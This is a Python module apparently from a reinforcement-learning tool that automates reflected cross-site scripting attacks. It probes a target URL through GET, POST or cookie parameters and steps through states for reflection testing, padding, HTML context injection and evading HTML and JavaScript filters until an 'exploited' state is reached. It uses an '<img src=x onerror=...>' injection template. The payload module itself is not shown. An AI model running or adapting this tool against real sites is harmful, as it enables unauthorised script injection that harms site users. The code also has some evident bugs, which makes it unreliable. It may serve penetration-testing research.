from bs4 import BeautifulSoup
import sys, random, string, requests, re
from . import xssExploit

# To add a new action: 
#  create a new method
#  add it to the self.actions dictionary in the states where it is allowed

# To add a new state:
#  add it to the self.states_name_to_location and self.states_location_to_name structures
#  add it to the self.action structure with its allowed actions
#  add the implementation in the resetPayload function
#  add the implementation in the goalCheck function
#  add the implementation in the goBack function 

class Enviroment:

    # Constructor that initiates the environment
    def __init__(self, url):
    
        # Default method and parameter 
        self.method = "GET"
        self.parameter = ""
        self.page = ""

        # Url 
        self.baseurl = url
        self.url = lambda: self.baseurl + self.page
        
        # Initiliaze xssPayload
        self.xssExploit = xssExploit.XssExploit()

        # States
        self.states_name_to_location = {
            "testReflection":0,
            "addPadding":1,
            "findValidHtml":2,
            "avoidHtmlFilters":3,
            "avoidJsFilters":4,
            "exploited":5
        }
        self.states_location_to_name= {
            0:"testReflection",
            1:"addPadding",
            2:"findValidHtml",
            3:"avoidHtmlFilters",
            4:"avoidJsFilters",
            5:"exploited"
        }

        # Actions
        self.actions = {
            self.states_name_to_location["testReflection"]: {
                0: self.xssExploit.actionNewTestString,
            },
            self.states_name_to_location["addPadding"]: {
                0: self.xssExploit.actionAddSxRandomChar,
                1: self.xssExploit.actionAddDxRandomChar
            },
            self.states_name_to_location["findValidHtml"]:{
                0: self.xssExploit.actionInjectionInText,
                1: self.xssExploit.actionInjectionInAttribute,
                2: self.xssExploit.actionInjectionInAttributeSingleQuote,
                3: self.xssExploit.actionInjectionInAttributeDoubleQuotes
            },
            self.states_name_to_location["avoidHtmlFilters"]:{
                0: self.xssExploit.actionNewHtmlPayload,
                1: self.xssExploit.actionDubleEncode
            },
            self.states_name_to_location["avoidJsFilters"]:{
                0: self.xssExploit.actionNewJsPayload
            },
            self.states_name_to_location["exploited"]:{
                0: self.xssExploit.actionNewTestString
            }
        }

    # GET/SET functions

    # Return number of actions by state
    def getNumOfActions(self,state):
        if state >= 0 and state < len(self.states_name_to_location):
            return len(self.actions[state])
        else: 
            return 0
        
    # Set method
    def setMethod(self, method, checkConnection=False):
        self.method = method
        if checkConnection:
            return self.checkConnection()

    # Set Page
    def setPage(self, page, checkConnection=False):
        self.page = page
        if checkConnection:
            return self.checkConnection()

    # Set parameter
    def setParameter(self, parameter, checkConnection=False):
        self.parameter = parameter
        if checkConnection:
            return self.checkConnection()

    # CONNECTION TO ENDPOINT

    # Request to endpoint 
    def checkConnection(self, printDetails = False, value=" "):

        #Connection
        response = self.connection(value)
        conn_status_code = 0
        conn_status = "[*] Connection OK"
        http_code = 0
        http_res_len = 0

        # Handling exception
        if type(response) != requests.models.Response:
            conn_status = "[!] {} error: {}".format(response["type"],response["msg"])
            conn_status_code = -1
        
        # No exception, so check status code
        else:
            http_code = response.status_code
            http_res_len = len(response.text)
            if response.status_code not in [200]:
                conn_status = "[!] Connection failed"
                conn_status_code = -1
        
        if printDetails:
            print("{}\n    Url: {}\n    Method: {}\n    Parameter: {}\n    Response code: {}\n    Response len: {}\n".format(conn_status, self.url(), self.method, self.parameter, http_code, http_res_len))
        
        return {
            "conn_status": conn_status,
            "conn_status_code": conn_status_code,
            "http_code": http_code,
            "http_res": response.text,
            "http_res_len": http_res_len,
            "method": self.method,
            "parameter": self.parameter,
            "url": self.url()
        }
            
    
    # Request to endpoint
    def connection(self, value):
        param = {}
        if self.parameter != "":
            param = {self.parameter: value}  
        try:  
            if self.method == "GET":
                response = requests.get(
                    self.url(),
                    timeout=5.0,
                    params=param
                )
            elif self.method == "POST":
                response = requests.post(
                    self.url(),
                    timeout=5.0,
                    data=param
                )
            elif self.method == "COOKIE":
                response = requests.get(
                    self.url(),
                    timeout=5.0,
                    cookies=param
                )
        except (requests.exceptions.Timeout):
            return {"type":"Connection","msg":"[!] Connection failed"}
        except requests.exceptions.HTTPError as err:
            return {"type":"Http","msg":err}
        except requests.exceptions.RequestException as err:
            return {"type":"Request","msg":err}

        # No exception, so return response
        return response

    # Only connect if the html is syntactically valid
    def connectionIfHtmlValid(self, response):
        print("Local test: {}".format(response))
        #TODO improve syntactically check
        if len(re.findall("<([^<>]*)>([^<>]*<img src=x onerror={}>[^<>]*)<([^<>]*)>",response)) > 0:
            return self.connection(self.xssExploit.payload())
        else:
            return ""

    # XSS EXPLOITATION

    # Returns the tag into where the random string was injected
    def getInjectionPoint(self, response):
        #print("[DEBUG] {} -> {}".format(self.xssExploit.expected(), response))
        soup = BeautifulSoup(response,features="lxml")
        for elem in soup(text=re.compile(self.xssExploit.expected())):
            injection_point = str(elem.parent).lower().replace(self.xssExploit.expected().lower(), "{}")
            if self.xssExploit.injection_point != "":
                self.xssExploit.injection_point = injection_point
                break
        if self.xssExploit.injection_point == "":
            self.xssExploit.injection_point = response.lower().replace(self.xssExploit.expected().lower(), "{}")

    # Execute action and return reward
    def doAction(self, state, action):
        print("\n[DEGUG]\nState: {}\nAction: {}".format(self.states_location_to_name[state],self.actions[state][action].__name__))
        
        self.actions[state][action]()

        # Check if state is locally tested
        response = ""
        if state == self.states_name_to_location["findValidHtml"]:
            response = self.connectionIfHtmlValid(self.xssExploit.injection_point.lower().replace("{}",self.xssExploit.getHtml()))
        else:
            response = self.connection(self.xssExploit.payload())
        
        return self.goalCheck(state,response)

    # Checks if an XSS has been triggered
    def goalCheck(self, state, response):

        expected = self.xssExploit.expected()

        # Handling exception
        if response:
            response = response.text
            print("Expected: {}\nResponce: {}".format(expected.lower(), response.lower()))
            if type(response) != requests.models.Response:
                if type(response) == str:
                    if response == "":
                        print("[!] error: null response")
                        sys.exit(1)
                else:
                    print("[!] {} error: {}".format(response["type"],response["msg"]))
                    sys.exit(1)
        else: 
            print("Local test: not valid HTML")
        
        # Condictions
        isExpectedResponse = expected.lower() in response.lower()

        # TEST REFLECTION STATE
        if self.states_location_to_name[state] == "testReflection":
            if isExpectedResponse:
                print("[passed] payload: {}".format(self.xssExploit.payload()))
                self.getInjectionPoint(response)
                return self.states_name_to_location["findValidHtml"], 100, False
            else:
                print("[filtered] payload: {}".format(self.xssExploit.payload()))
                return self.states_name_to_location["addPadding"], -1, False

        # ADD PADDING STATE
        elif self.states_location_to_name[state] == "addPadding":
            if isExpectedResponse and self.xssExploit.payload().lower() not in response.lower():
                print("[passed] payload: {}".format(self.xssExploit.payload()))
                self.getInjectionPoint(response)
                return self.states_name_to_location["findValidHtml"], 100, False
            elif self.xssExploit.payload().lower() not in response.lower():
                print("[filtered] payload: {}".format(self.xssExploit.payload()))
                return self.states_name_to_location["addPadding"], 10, False
            else:
                print("[filtered] payload: {}".format(self.xssExploit.payload()))
                return self.states_name_to_location["addPadding"], -1, False

        # FIND VALID HTML STATE
        elif self.states_location_to_name[state] == "findValidHtml":
            if response != "":
                if isExpectedResponse:
                    print("[passed] payload: {}".format(self.xssExploit.payload()))
                    return self.states_name_to_location["avoidJsFilters"], 100, False
                else:
                    print("[passed] payload: {}".format(self.xssExploit.payload()))
                    return self.states_name_to_location["avoidHtmlFilters"], 100, False
            else:
                print("[filtered] payload: {}".format(self.xssExploit.payload()))
                return self.states_name_to_location["findValidHtml"], -1, False

        # AVOID HTML FILTERS STATE 
        elif self.states_location_to_name[state] == "avoidHtmlFilters":
            if isExpectedResponse:
                print("[passed] payload: {}".format(self.xssExploit.payload()))
                return self.states_name_to_location["avoidJsFilters"], 100, False
            else:
                print("[filtered] payload: {}".format(self.xssExploit.payload()))
                return self.states_name_to_location["avoidHtmlFilters"], -1, False

        # AVOID JS FILTERS STATE 
        elif self.states_location_to_name[state] == "avoidJsFilters":
            if isExpectedResponse:
                print("[passed] payload: {}".format(self.xssExploit.payload()))
                return self.states_name_to_location["exploited"], 100, True
            else:
                print("[filtered] payload: {}".format(self.xssExploit.payload()))
                return self.states_name_to_location["avoidJsFilters"], -1, False

    # RESET AND GO BACK FUNCTIONS 

    # Roll back all actions done in this state
    def resetPayload(self, state):

        # TEST REFLECTION STATE
        if self.states_location_to_name[state] == "testReflection":
            self.xssExploit.setHtmlBody("","")
        
        # ADD PADDING STATE
        elif self.states_location_to_name[state] == "addPadding":
            self.xssExploit.setPaddings("","")
        
        # FIND VALID HTML STATE
        elif self.states_location_to_name[state] == "findValidHtml":
            self.xssExploit.setHtmlSyntaxPaddings("","","","")
        
        # AVOID HTML FILTERS STATE 
        elif self.states_location_to_name[state] == "avoidHtmlFilters":
            self.xssExploit.setHtmlBody("","")

        # AVOID JS FILTERS STATE 
        elif self.states_location_to_name[state] == "avoidJsFilters":
            self.xssExploit.setJsBody("","")

    # Go to the previous state, return the new state and a boolean indicating whether one has returned to the starting point
    def goBack(self, state):

        # TEST REFLECTION STATE
        if self.states_location_to_name[state] == "testReflection":
            return self.states_name_to_location["testReflection"], True
        
        # ADD PADDING STATE
        elif self.states_location_to_name[state] == "addPadding":
            return self.states_name_to_location["testReflection"], False
        
        # FIND VALID HTML STATE
        elif self.states_location_to_name[state] == "findValidHtml":
            return self.states_name_to_location["testReflection"], False
        
        # AVOID HTML FILTERS STATE 
        elif self.states_location_to_name[state] == "avoidHtmlFilters":
            return self.states_name_to_location["findValidHtml"], False

        # AVOID JS FILTERS STATE 
        elif self.states_location_to_name[state] == "avoidJsFilters":
            return self.states_name_to_location["avoidHtmlFilters"], False